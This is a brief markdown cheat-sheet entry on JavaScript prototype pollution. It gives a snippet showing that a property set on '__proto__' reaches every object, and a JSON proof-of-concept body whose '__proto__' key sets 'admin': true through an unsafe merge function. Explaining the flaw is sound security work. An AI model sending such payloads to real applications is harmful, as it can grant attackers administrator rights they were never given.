# Prototype Pollution
- Manipulate the prototype of an attribute of an object so that instances with that undefined attribute inherit the value of the manipulated prototype.
	```js
	var user1 = {}
	var user2 = {}
	user1.__proto__.isAdmin = "Yes"
	console.log(user1.isAdmin)
	console.log(user2.isAdmin)
	```
- Make sure in the code exists the function **merge** to merge attributes in an object.
	```json
	{
		"email":"test@test.com",
		"msg":"Hi this is a POC",
		"__proto__": {
			"admin": true
		}
	}
	```